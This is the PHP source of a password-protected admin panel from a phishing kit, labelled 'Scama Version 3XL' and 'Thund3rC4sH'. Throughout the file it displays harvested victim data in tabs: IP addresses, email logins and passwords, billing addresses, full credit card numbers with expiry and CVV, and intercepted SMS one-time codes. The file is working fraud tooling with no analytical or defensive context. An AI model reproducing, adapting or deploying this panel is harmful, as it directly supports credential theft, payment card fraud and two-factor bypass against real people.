<?php
@ini_set('display_errors', 'on');
include'../system/setting.php';

	 //** Scama Version 3XL - 12-11-2020  x

	  

// Le mot de passe n'a pas été envoyé ou n'est pas bon
if (!isset($_POST['pass']) OR $_POST['pass'] != $pass)
{
	// Afficher le formulaire de saisie du mot de passe
 ?>
 <link rel='stylesheet' type='text/css' href='../files/css/bootstrap.css'>
	<link href='../files/css/flat-ui.css' rel='stylesheet'>
    <link href='../files/css/demo.css' rel='stylesheet'>
	<body>
      <div class="demo-headline">
        <h1 class="demo-logo">
          <div class="logo"></div>
        </h1>
      </div> <!-- /demo-headline -->
	  <div class='lead'>
	 <div class="login">
   <div class="login-form">

<form action="" method='post'>

<table align="center" border="0">

  <tr>
 
    <td><div class="form-group">
              <input type="password" class="form-control login-field" value="" name="pass" placeholder="Password" id="pass">
              <label class="login-field-icon fui-lock" for="login-pass"></label>
            </div></td>
  </tr><br>
  <tr> <td> <input name="submit" class="btn btn-primary btn-lg btn-block" type="submit" value="log in"></td></tr>
</table>

</form> 
</div></div> </div>

<?php
} 
else 
{ ?>
	<head><meta http-equiv='Content-Language' content='en-us'></head>
	<title>Thund3rC4sH</title>
	<link rel='stylesheet' type='text/css' href='../files/css/bootstrap.css'>
	<link href='../files/css/flat-ui.css' rel='stylesheet'>
    <link href='../files/css/demo.css' rel='stylesheet'>
   <script type='text/javascript' src='../files/js/modernizr.min.js'></script>
   <script src='../files/js/jquery.js'></script>
	</link>
	<div class='container'>
	<body>
	<div class='demo-headline'>
	<h1 class='demo-logo'>
          <div class='logo'></div>
        </h1>
		</div>
	<nav class='navbar navbar-default' role='navigation'>
  <div class='navbar-header'>
    <button type='button' class='navbar-toggle' data-toggle='collapse' data-target='#navbar-collapse-01'>
      <span class='sr-only'>Toggle navigation</span>
    </button>
    <a class='navbar-brand' href='#' id='load01'>Home</a>
  </div>
  <div class='collapse navbar-collapse' id='navbar-collapse-01'>
   <ul class='nav navbar-nav'>        
      <li><a  href='#' id='load02'>Login</a></li>
    </ul> 
  	 <ul class='nav navbar-nav'>        
      <li><a  href='#' id='load03'>Billing</a></li>
    </ul> 
      <ul class='nav navbar-nav'>          
      <li><a href='#' id='load04'>Credit Card</a></li>
    </ul>    
      <ul class='nav navbar-nav'>          
      <li><a href='#' id='load05'>Sms</a></li>
    </ul>  	
  </div><!-- /.navbar-collapse -->
 
</nav><!-- /navbar --> 
<script>
$(document).ready( function() {
    $('#load01').on('click', function() {
        $('#01').show();
		$('#02').hide();
		$('#03').hide();
		$('#04').hide();
		$('#05').hide();
    });
	$('#load02').on('click', function() {
        $('#01').hide();
		$('#02').show();
		$('#03').hide();
		$('#04').hide();
		$('#05').hide();
    });
	 $('#load03').on('click', function() {
		$('#01').hide();
		$('#02').hide();
        $('#03').show();
	    $('#04').hide();
	    $('#05').hide();
    });
	 $('#load04').on('click', function() {
        $('#01').hide();
		$('#02').hide();
		$('#03').hide();
		$('#04').show();
		$('#05').hide();
    });
	 $('#load05').on('click', function() {
        $('#01').hide();
		$('#02').hide();
		$('#03').hide();
		$('#04').hide();
		$('#05').show();
    });
});
</script>
		<div align='center' id='01' style=''>
		<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
        // document.getElementById('fixed').style.visibility="hidden";
            var rowCount = $("#vis td").closest("tr").length;
            var message = rowCount;
			 var rowCount2 = $("#log td").closest("tr").length;
            var message2 = rowCount2;
			 var rowCount3 = $("#cc td").closest("tr").length;
            var message3 = rowCount3;
			document.getElementById('lbl').innerText = message;
			document.getElementById('lbl2').innerText = message2;
			document.getElementById('lbl3').innerText = message3;
      },);
  }
}
   
</script>

	
<style>

</style>

<div class="main-overview">
  <div class="overviewcard"><svg  width="3em" height="3em" viewBox="0 0 16 16"  fill="currentColor" class="bi bi-eye">
  <path fill-rule="evenodd" d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.134 13.134 0 0 0 1.66 2.043C4.12 11.332 5.88 12.5 8 12.5c2.12 0 3.879-1.168 5.168-2.457A13.134 13.134 0 0 0 14.828 8a13.133 13.133 0 0 0-1.66-2.043C11.879 4.668 10.119 3.5 8 3.5c-2.12 0-3.879 1.168-5.168 2.457A13.133 13.133 0 0 0 1.172 8z"/>
  <path fill-rule="evenodd" d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
</svg>
    <div class="overviewcard__icon"></div>
    <div id="lbl" class="overviewcard__info">
	</div>
  </div>
  <div class="overviewcard">
    <div  class="overviewcard__icon">
	<svg width="3em" height="3em" viewBox="0 0 16 16" class="bi bi-key" fill="currentColor">
  <path fill-rule="evenodd" d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8zm4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5z"/>
  <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"/>
</svg></div>
    <div id="lbl2" class="overviewcard__info"></div>
  </div>
  <div class="overviewcard">
    <div  class="overviewcard__icon"><svg width="3em" height="3em" viewBox="0 0 16 16" class="bi bi-credit-card" fill="currentColor">
  <path fill-rule="evenodd" d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2-1a1 1 0 0 0-1 1v1h14V4a1 1 0 0 0-1-1H2zm13 4H1v5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V7z"/>
  <path d="M2 10a1 1 0 0 1 1-1h1a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1v-1z"/>
</svg></div>
    <div id="lbl3" class="overviewcard__info"></div>
  </div>
</div>
	<h3>Visitantes  <span class='fui-eye'></span></h3><br>
	<table id='vis' width='76' class='table table-hover'>
		
		<tr>
			<th width='80'>
			<p align='center'>IP</td>
			<th width='80'>
            <p align='center'>browser</td>
			<th width='80'>
            <p align='center'>os</td>
			<th width='30'>
			<p align='center'>Country</td>
			<th width='80'>
			<p align='center'>Date & time</td>
		</tr>
		 
<?php  if (file_exists('vis'.$namerand.'.html')){ include 'vis'.$namerand.'.html'; }else{echo "0 Visitantes";} ?>

</table></div>
<div align='center'  id='02' style='display:none;'>
	<h3>Login  <span class='fui-heart'></span></h3><br>
	<table  id='log' width='76' class='table table-hover'>
<tr>
			<th width='80'>
			<p align='center'>IP</th>
			<th width='80'>
			<p align='center'>Email</th>
			<th width='80'>
			<p align='center'>Password</th>
			<th width='80'>
			<p align='center'>system</th>
			<th width='100'>
			<p align='center'>useragent</th>
			<th width='60'>
			<p align='center'>Date & time</th>
		</tr>
		
		<?php  if (file_exists('log'.$namerand.'.html')){ include 'log'.$namerand.'.html'; }else{echo "0 Login";} ?>
</table></div>
<div align='center'  id='03' style='display:none;'>
	<h3>Bill  <span class='fui-new'></span></h3><br>
	<table id='bill' width='76' class='table table-hover'>
<tr>
			<th width='80'>
			<p align='center'>IP</td>
			<th width='40'>
			<p align='center'>Full Name</td>
			<th width='60'>
			<p align='center'>Address</td>
			<th width='40'>
			<p align='center'>city</td>
			<th width='20'>
			<p align='center'>zip</td>
			<th width='40'>
			<p align='center'>state</td>
			<th width='40'>
			<p align='center'>Country</td>
			<th width='20'>
			<p align='center'>Phone</td>
			<th width='60'>
			<p align='center'>Date & time</td>
		</tr>

<?php  if (file_exists('bill'.$namerand.'.html')){ include 'bill'.$namerand.'.html'; }else{echo "0 Billing Address";} ?>
</table></div>
<div align='center'  id='04' style='display:none;'>
	<h3>Credit Card  <span class='fui-heart'></span></h3><br>
	<table  id='cc' width='76' class='table table-hover'>
<tr>
			<th width='80'>
			<p align='center'>IP</th>
			<th width='20'>
			<p align='center'>CardBrand</th>
			<th width='40'>
			<p align='center'>Card Full Name</th>
			<th width='60'>
			<p align='center'>Card Num</th>
			<th width='20'>
			<p align='center'>Date Exp</th>
			<th width='10'>
			<p align='center'>cvv</th>
			<th width='40'>
			<p align='center'>CardType</th>
			<th width='40'>
			<p align='center'>Category</th>
			<th width='20'>
			<p align='center'>Bank Name</th>
			<th width='60'>
			<p align='center'>Date & time</th>
		</tr>
		
		<?php  if (file_exists('cc'.$namerand.'.html')){ include 'cc'.$namerand.'.html'; }else{echo "0 Credit Card";} ?>
</table></div>
<div align='center'  id='05' style='display:none;'>
	<h3>OTP  <span class='fui-mail'></span></h3><br>
	<table id='otp' width='76' class='table table-hover'>
<tr>
<th width='80'><p align='center'>IP</th>
<th width='30'><p align='center'>SMS ID</th>
<th width='40'><p align='center'>Code</th>
<th width='40'><p align='center'>Date & time</th>
</tr>
<?php  if (file_exists('otp'.$namerand.'.html')){ include 'otp'.$namerand.'.html'; }else{echo "0 OTP CODE";} ?>
</table></div>
<?php
} 
?>

